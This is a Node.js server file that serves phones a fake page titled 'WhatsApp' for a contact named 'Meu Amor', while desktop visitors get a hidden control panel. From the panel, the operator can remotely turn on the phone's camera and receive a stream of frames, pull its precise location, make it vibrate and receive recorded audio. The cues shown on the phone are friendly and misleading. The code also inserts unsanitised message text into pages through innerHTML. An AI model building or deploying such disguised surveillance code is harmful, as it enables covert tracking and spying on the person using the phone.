const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Rota principal
app.get('/', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /mobile|android|iphone|ipad|phone|blackberry|iemobile|opera mini/i.test(userAgent);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(getMobileWhatsApp(fullUrl));
  } else {
    res.send(getPCControlPanel(fullUrl));
  }
});

// Health check
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'online', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('✅ Cliente conectado:', socket.id);
  
  // Mensagens de texto
  socket.on('send_message', (data) => {
    console.log('📨 Mensagem:', data.text);
    socket.broadcast.emit('new_message', data);
  });
  
  // Áudio
  socket.on('send_audio', (data) => {
    console.log('🎤 Áudio recebido');
    socket.broadcast.emit('new_audio', data);
  });
  
  // Indicador de digitação
  socket.on('typing_start', () => {
    socket.broadcast.emit('user_typing', { isTyping: true });
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('user_typing', { isTyping: false });
  });
  
  // Comandos do PC
  socket.on('command', (command) => {
    console.log('🎮 Comando:', command.type);
    socket.broadcast.emit('execute_command', command);
  });
  
  // Streaming de câmera
  socket.on('camera_frame', (frameData) => {
    socket.broadcast.emit('camera_stream', frameData);
  });
  
  // Localização
  socket.on('location_update', (location) => {
    console.log('📍 Localização:', location.lat, location.lng);
    socket.broadcast.emit('new_location', location);
  });
  
  // Status do dispositivo
  socket.on('device_status', (status) => {
    socket.broadcast.emit('peer_status', status);
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Cliente desconectado:', socket.id);
    socket.broadcast.emit('peer_disconnected');
  });
});

// Iniciar servidor
server.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '='.repeat(50));
  console.log('🚀 WHATSAPP REMOTE CONTROL - SERVIDOR ATIVO');
  console.log('='.repeat(50));
  console.log(`📡 Porta: ${PORT}`);
  console.log(`🌐 Local: http://localhost:${PORT}`);
  console.log(`📱 Acesse no celular usando o mesmo IP da rede`);
  console.log('='.repeat(50) + '\n');
});

// ==================== PÁGINA DO CELULAR (WHATSAPP) ====================
function getMobileWhatsApp(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }

        /* Container principal */
        .app {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0b141a;
        }

        /* Header WhatsApp */
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            position: relative;
        }

        .online-badge {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 12px;
            height: 12px;
            background: #25d366;
            border-radius: 50%;
            border: 2px solid #202c33;
        }

        .contact-info h3 {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
        }

        .contact-status {
            color: #8696a0;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .header-right {
            display: flex;
            gap: 20px;
        }

        .header-icon {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
        }

        /* Área de mensagens */
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background-image: radial-gradient(circle at 25% 40%, rgba(255,255,255,0.02) 2%, transparent 2%);
            background-size: 40px 40px;
        }

        /* Balões de mensagem */
        .message {
            max-width: 80%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.4;
            position: relative;
            animation: fadeIn 0.2s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }

        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }

        .message-text {
            word-wrap: break-word;
        }

        .message-meta {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 4px;
            font-size: 10px;
            color: #8696a0;
        }

        /* Mensagem de áudio */
        .audio-message {
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 180px;
        }

        .audio-play {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
        }

        .audio-waveform {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 3px;
            height: 30px;
        }

        .wave {
            width: 3px;
            background: #e9edef;
            border-radius: 2px;
            animation: wave 0.5s ease infinite alternate;
        }

        @keyframes wave {
            from { height: 5px; }
            to { height: 20px; }
        }

        /* Indicador de digitação */
        .typing-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            background: #202c33;
            border-radius: 16px;
            width: fit-content;
            margin-bottom: 8px;
        }

        .typing-dots {
            display: flex;
            gap: 4px;
        }

        .typing-dots span {
            width: 6px;
            height: 6px;
            background: #8696a0;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }

        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }

        /* Área de input */
        .input-area {
            background: #202c33;
            padding: 8px 12px;
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }

        .input-field::placeholder {
            color: #8696a0;
        }

        .input-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
            transition: all 0.2s;
        }

        .input-btn.active {
            color: #25d366;
        }

        /* Toast de notificação */
        .toast {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e2a32;
            color: #e9edef;
            padding: 8px 16px;
            border-radius: 24px;
            font-size: 13px;
            z-index: 1000;
            animation: slideUp 0.3s ease;
            white-space: nowrap;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        /* Menu lateral */
        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99;
            display: none;
        }

        .side-menu {
            position: fixed;
            top: 0;
            right: -280px;
            width: 280px;
            height: 100%;
            background: #202c33;
            z-index: 100;
            transition: right 0.3s ease;
            box-shadow: -2px 0 8px rgba(0,0,0,0.3);
        }

        .side-menu.open {
            right: 0;
        }

        .menu-header {
            padding: 60px 20px 20px;
            background: #2a3942;
            text-align: center;
        }

        .menu-item {
            padding: 16px 20px;
            color: #e9edef;
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #2a3942;
            cursor: pointer;
            transition: background 0.2s;
        }

        .menu-item:hover {
            background: #2a3942;
        }

        .menu-item:active {
            background: #3b4a54;
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Header -->
        <div class="header">
            <div class="header-left">
                <div class="avatar">
                    💕
                    <div class="online-badge"></div>
                </div>
                <div class="contact-info">
                    <h3>Meu Amor</h3>
                    <div class="contact-status" id="statusText">
                        <span>🟢</span> online
                    </div>
                </div>
            </div>
            <div class="header-right">
                <button class="header-icon" id="menuBtn">⋮</button>
            </div>
        </div>

        <!-- Mensagens -->
        <div class="messages" id="messagesContainer">
            <div class="message received">
                <div class="message-text">💕 Olá! Estou aqui para você 💕</div>
                <div class="message-meta">
                    <span>Agora</span>
                    <span>✓✓</span>
                </div>
            </div>
        </div>

        <!-- Input -->
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
            <button class="input-btn" id="micBtn">🎤</button>
            <button class="input-btn" id="sendBtn">📤</button>
        </div>
    </div>

    <!-- Menu -->
    <div class="menu-overlay" id="menuOverlay"></div>
    <div class="side-menu" id="sideMenu">
        <div class="menu-header">
            <div style="font-size: 48px;">💕</div>
            <h3 style="color: #e9edef; margin-top: 10px;">Configurações</h3>
        </div>
        <div class="menu-item" id="cameraMenu">
            <span>📷</span> Ativar Câmera
        </div>
        <div class="menu-item" id="locationMenu">
            <span>📍</span> Compartilhar Localização
        </div>
        <div class="menu-item" id="vibrateMenu">
            <span>📳</span> Testar Vibração
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        // Configuração
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });

        // Elementos
        const messagesContainer = document.getElementById('messagesContainer');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const micBtn = document.getElementById('micBtn');
        const menuBtn = document.getElementById('menuBtn');
        const menuOverlay = document.getElementById('menuOverlay');
        const sideMenu = document.getElementById('sideMenu');
        const statusText = document.getElementById('statusText');

        // Estado
        let isRecording = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let typingTimeout = null;
        let cameraStream = null;

        // ========== FUNÇÕES ==========
        function showToast(message) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        function addMessage(text, type = 'received', isAudio = false, audioUrl = null) {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            
            if (isAudio && audioUrl) {
                const audioId = 'audio_' + Date.now();
                messageDiv.innerHTML = \`
                    <div class="audio-message">
                        <button class="audio-play" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('\${audioId}')[this.innerHTML==='▶️'?'pause':'play']()">▶️</button>
                        <div class="audio-waveform">
                            <div class="wave" style="animation-duration: 0.3s"></div>
                            <div class="wave" style="animation-duration: 0.5s"></div>
                            <div class="wave" style="animation-duration: 0.4s"></div>
                            <div class="wave" style="animation-duration: 0.6s"></div>
                        </div>
                        <audio id="\${audioId}" src="\${audioUrl}" style="display: none;"></audio>
                    </div>
                    <div class="message-meta">
                        <span>\${timeStr}</span>
                        <span>✓✓</span>
                    </div>
                \`;
            } else {
                messageDiv.innerHTML = \`
                    <div class="message-text">\${text}</div>
                    <div class="message-meta">
                        <span>\${timeStr}</span>
                        <span>✓✓</span>
                    </div>
                \`;
            }
            
            messagesContainer.appendChild(messageDiv);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text, timestamp: Date.now() });
                messageInput.value = '';
                stopTyping();
            }
        }

        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }

        function stopTyping() {
            socket.emit('typing_stop');
        }

        // ========== ÁUDIO ==========
        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => audioChunks.push(event.data);
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    addMessage('🎤 Mensagem de voz', 'sent', true, audioUrl);
                    
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('send_audio', { audio: reader.result, timestamp: Date.now() });
                    };
                    reader.readAsDataURL(audioBlob);
                    
                    stream.getTracks().forEach(track => track.stop());
                    showToast('🎤 Áudio enviado!');
                };
                
                mediaRecorder.start();
                isRecording = true;
                micBtn.textContent = '⏹️';
                micBtn.classList.add('active');
                showToast('🎤 Gravando... Clique novamente para parar');
            } catch (err) {
                console.error(err);
                showToast('❌ Erro ao acessar microfone');
            }
        }

        function stopRecording() {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                micBtn.textContent = '🎤';
                micBtn.classList.remove('active');
            }
        }

        // ========== CÂMERA ==========
        async function startCamera() {
            showToast('📷 Iniciando câmera...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cameraStream = stream;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                setInterval(() => {
                    if (cameraStream && cameraStream.active) {
                        imageCapture.grabFrame()
                            .then(imageBitmap => {
                                const canvas = document.createElement('canvas');
                                canvas.width = imageBitmap.width;
                                canvas.height = imageBitmap.height;
                                canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
                                socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                            })
                            .catch(() => {});
                    }
                }, 500);
                
                showToast('📷 Câmera ativada!');
            } catch (err) {
                console.error(err);
                showToast('❌ Erro ao acessar câmera');
            }
        }

        // ========== LOCALIZAÇÃO ==========
        function getLocation() {
            if (!navigator.geolocation) {
                showToast('❌ Geolocalização não suportada');
                return;
            }
            
            showToast('📍 Obtendo localização...');
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    socket.emit('location_update', location);
                    addMessage(\`📍 Minha localização: \${location.lat.toFixed(4)}, \${location.lng.toFixed(4)}\`, 'sent');
                    showToast('📍 Localização enviada!');
                },
                (error) => {
                    console.error(error);
                    showToast('❌ Erro ao obter localização');
                },
                { enableHighAccuracy: true }
            );
        }

        // ========== EVENTOS ==========
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
        messageInput.addEventListener('input', startTyping);
        
        micBtn.addEventListener('click', () => {
            if (isRecording) stopRecording();
            else startRecording();
        });
        
        // Menu
        menuBtn.addEventListener('click', () => {
            sideMenu.classList.add('open');
            menuOverlay.style.display = 'block';
        });
        
        function closeMenu() {
            sideMenu.classList.remove('open');
            menuOverlay.style.display = 'none';
        }
        
        menuOverlay.addEventListener('click', closeMenu);
        document.getElementById('cameraMenu').addEventListener('click', () => { startCamera(); closeMenu(); });
        document.getElementById('locationMenu').addEventListener('click', () => { getLocation(); closeMenu(); });
        document.getElementById('vibrateMenu').addEventListener('click', () => {
            if (navigator.vibrate) navigator.vibrate(200);
            showToast('📳 Vibração!');
            closeMenu();
        });
        
        // Socket events
        socket.on('new_message', (data) => {
            addMessage(data.text, 'received');
            showToast('💬 Nova mensagem');
        });
        
        socket.on('new_audio', (data) => {
            addMessage('🎤 Mensagem de áudio', 'received', true, data.audio);
            showToast('🎤 Nova mensagem de áudio');
        });
        
        socket.on('user_typing', (data) => {
            statusText.innerHTML = data.isTyping ? '<span>✍️</span> digitando...' : '<span>🟢</span> online';
        });
        
        socket.on('execute_command', (command) => {
            if (command.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
                showToast('📳 Vibração recebida!');
            } else if (command.type === 'emergency') {
                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
                showToast('💖 Surpresa Especial! 💖');
                addMessage('💖 Recebi uma surpresa especial! 💖', 'received');
            } else if (command.type === 'get_location') {
                getLocation();
            } else if (command.type === 'start_camera') {
                startCamera();
            }
        });
        
        socket.on('connect', () => {
            showToast('✨ Conectado! ✨');
            socket.emit('device_status', { status: 'online', device: 'mobile' });
        });
        
        socket.on('disconnect', () => {
            showToast('❌ Desconectado');
        });
    </script>
</body>
</html>`;
}

// ==================== PÁGINA DO PC (CONTROLE) ====================
function getPCControlPanel(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web - Painel de Controle</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #111b21;
            height: 100vh;
            overflow: hidden;
        }

        .app {
            display: flex;
            height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 320px;
            background: #202c33;
            border-right: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
        }

        .sidebar-header {
            padding: 20px 16px;
            background: #202c33;
            border-bottom: 1px solid #2a3942;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .avatar {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .user-name {
            color: #e9edef;
            font-weight: 500;
            font-size: 16px;
        }

        /* Chat principal */
        .main-chat {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0b141a;
        }

        .chat-header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }

        .contact-info h3 {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
        }

        .contact-status {
            color: #8696a0;
            font-size: 12px;
        }

        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.4;
        }

        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }

        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }

        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }

        .input-area {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }

        .send-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }

        /* Painel de controle */
        .control-panel {
            width: 340px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .panel-section {
            padding: 20px;
            border-bottom: 1px solid #2a3942;
        }

        .panel-title {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-control {
            width: 100%;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: #e9edef;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
            transition: all 0.2s;
        }

        .btn-control:hover {
            background: #3b4a54;
            transform: translateY(-1px);
        }

        .btn-control:active {
            transform: translateY(0);
        }

        .btn-danger {
            background: #c0392b;
        }

        .btn-danger:hover {
            background: #e74c3c;
        }

        .btn-success {
            background: #005c4b;
        }

        .btn-success:hover {
            background: #006f5a;
        }

        .video-preview {
            background: #111b21;
            border-radius: 8px;
            margin-top: 12px;
            overflow: hidden;
        }

        .video-preview img {
            width: 100%;
            height: auto;
            display: block;
        }

        .location-info {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            color: #8696a0;
            margin-top: 12px;
            word-break: break-all;
        }

        .location-info a {
            color: #25d366;
            text-decoration: none;
        }

        .status-badge {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #25d366;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .typing-badge {
            color: #25d366;
            font-size: 11px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="user-info">
                    <div class="avatar">💻</div>
                    <div>
                        <div class="user-name">PC - Controle</div>
                        <div style="color: #8696a0; font-size: 12px;">Conectado</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Chat Principal -->
        <div class="main-chat">
            <div class="chat-header">
                <div>
                    <h3 class="contact-name">Meu Amor 💕</h3>
                    <div class="contact-status" id="contactStatus">
                        <span class="status-badge"></span> online
                    </div>
                </div>
            </div>

            <div class="messages-area" id="messagesArea">
                <div class="message received">
                    💕 Olá! Estou aqui para você 💕
                    <div class="message-meta">Agora</div>
                </div>
            </div>

            <div class="input-area">
                <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
                <button class="send-btn" id="sendBtn">📤</button>
            </div>
        </div>

        <!-- Painel de Controle -->
        <div class="control-panel">
            <div class="panel-section">
                <div class="panel-title">
                    <span>📹</span> Controle de Câmera
                </div>
                <button class="btn-control" id="startCameraBtn">
                    <span>📷</span> Ativar Câmera do Celular
                </button>
                <div class="video-preview">
                    <img id="cameraPreview" src="" alt="Preview da câmera">
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>📍</span> Localização
                </div>
                <button class="btn-control" id="getLocationBtn">
                    <span>📍</span> Solicitar Localização
                </button>
                <div class="location-info" id="locationInfo">
                    Aguardando localização...
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>💖</span> Ações Especiais
                </div>
                <button class="btn-control" id="vibrateBtn">
                    <span>📳</span> Vibrar Celular
                </button>
                <button class="btn-control btn-danger" id="emergencyBtn">
                    <span>💥</span> Surpresa Especial
                </button>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>ℹ️</span> Status
                </div>
                <div style="background: #111b21; padding: 12px; border-radius: 8px;">
                    <div style="color: #8696a0; font-size: 12px;">
                        <div>🟢 Conectado ao celular</div>
                        <div id="connectionStatus" style="margin-top: 5px;">Aguardando conexão...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });

        // Elementos
        const messagesArea = document.getElementById('messagesArea');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationInfo = document.getElementById('locationInfo');
        const contactStatus = document.getElementById('contactStatus');
        const connectionStatus = document.getElementById('connectionStatus');

        let typingTimeout = null;

        function addMessage(text, type = 'sent') {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            messageDiv.innerHTML = \`
                \${text}
                <div class="message-meta">\${timeStr}</div>
            \`;
            messagesArea.appendChild(messageDiv);
            messagesArea.scrollTop = messagesArea.scrollHeight;
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text, timestamp: Date.now() });
                messageInput.value = '';
            }
        }

        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1000);
        }

        // Eventos de input
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
        messageInput.addEventListener('input', startTyping);

        // Controles
        document.getElementById('startCameraBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'start_camera' });
            addMessage('📷 Solicitando ativação da câmera...', 'sent');
        });

        document.getElementById('getLocationBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'get_location' });
            addMessage('📍 Solicitando localização...', 'sent');
        });

        document.getElementById('vibrateBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'vibrate' });
            addMessage('📳 Vibração enviada', 'sent');
        });

        document.getElementById('emergencyBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'emergency' });
            addMessage('💥 Surpresa especial enviada!', 'sent');
        });

        // Receber dados
        socket.on('new_message', (data) => {
            addMessage(data.text, 'received');
        });

        socket.on('new_audio', (data) => {
            addMessage('🎤 Mensagem de áudio recebida', 'received');
        });

        socket.on('camera_stream', (frameData) => {
            cameraPreview.src = frameData;
        });

        socket.on('new_location', (location) => {
            locationInfo.innerHTML = \`
                📍 Localização do celular:<br>
                Latitude: \${location.lat.toFixed(6)}<br>
                Longitude: \${location.lng.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">
                    🗺️ Abrir no Google Maps
                </a>
            \`;
            addMessage(\`📍 Localização recebida: \${location.lat.toFixed(4)}, \${location.lng.toFixed(4)}\`, 'received');
        });

        socket.on('user_typing', (data) => {
            if (data.isTyping) {
                contactStatus.innerHTML = '<span class="typing-badge">✍️</span> digitando...';
            } else {
                contactStatus.innerHTML = '<span class="status-badge"></span> online';
            }
        });

        socket.on('peer_status', (status) => {
            if (status.status === 'online') {
                contactStatus.innerHTML = '<span class="status-badge"></span> online';
                connectionStatus.innerHTML = '✅ Celular conectado';
            }
        });

        socket.on('peer_disconnected', () => {
            contactStatus.innerHTML = '<span style="color: #8696a0;">●</span> offline';
            connectionStatus.innerHTML = '⚠️ Celular desconectado';
        });

        socket.on('connect', () => {
            addMessage('✨ Conectado ao celular!', 'received');
            connectionStatus.innerHTML = '✅ Conectado ao servidor';
        });

        socket.on('disconnect', () => {
            connectionStatus.innerHTML = '❌ Desconectado do servidor';
        });
    </script>
</body>
</html>`;
}
